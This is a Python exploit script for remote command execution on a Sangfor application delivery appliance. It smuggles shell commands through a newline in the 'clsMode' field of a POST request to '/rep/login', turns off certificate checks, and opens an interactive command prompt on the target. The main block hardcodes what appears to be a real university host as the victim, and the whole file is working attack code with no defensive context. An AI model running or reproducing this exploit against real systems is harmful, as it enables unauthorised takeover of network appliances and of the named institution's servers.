from urllib.parse import urlparse
from requests import post
import urllib3
urllib3.disable_warnings()  # Disable SSL warning while using proxies


class SangforAppDepRce:
    base_url: str = ""
    headers: dict = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    exp_data = {
        "index": "index",
        "log_type": "report",
        "loginType": "account",
        "page": "login",
        "rnd": "0",
        "userID": "admin",
        "userPsw": "123"
    }
    proxies: dict = None

    def __init__(self, url: str, proxies: dict = None):
        url_data = urlparse(url)
        self.base_url = url_data.scheme + "://" + url_data.netloc
        print("[*] Init: Setting target as", self.base_url)
        if proxies is not None:
            self.proxies = proxies

    def check_vuln(self) -> bool:
        print("[*] Target:", self.base_url)
        print("[*] Vuln: Sangfor AD RCE.")
        real_url = self.base_url + "/rep/login"
        print("[*] Checking vuln from:", real_url)
        self.run_command("whoami")
        print("[+] Vuln seems avaliable!")
        return True

    def run_command(self, cmd: str = "id"):
        real_url = self.base_url + "/rep/login"
        print("[*] Exploiting in:", real_url)
        data = self.exp_data
        data["clsMode"] = f"cls_mode_login\n{cmd}\n"
        if self.proxies is not None:
            rsp = post(url=real_url, headers=self.headers, data=data, proxies=self.proxies, verify=False, timeout=5)
        else:
            print("[*] Not using proxies...")
            rsp = post(url=real_url, headers=self.headers, data=data, verify=False, timeout=5)
        if f"%0A{cmd}%0A" in rsp.text:
            print("[-] Run command failed. Target seems safe.")
            print(f"[-] RetCode: {rsp.status_code} RspText: {rsp.text}")
            exit()
        if rsp.status_code == 200:
            print(f"[+] Command [{cmd}] done.")
            print("[+] RetData:", rsp.text.strip())
        else:
            print("[-] Run command failed. Target seems safe.")
            print(f"[-] RetCode: {rsp.status_code} RspLen: {len(rsp.text)}")
            exit()


if __name__ == "__main__":
    host_addr = "https://hqjt.cjxy.edu.cn:85"
    ins = SangforAppDepRce(url=host_addr)
    if ins.check_vuln():
        while True:
            cmd = input("# ")
            ins.run_command(cmd=cmd)
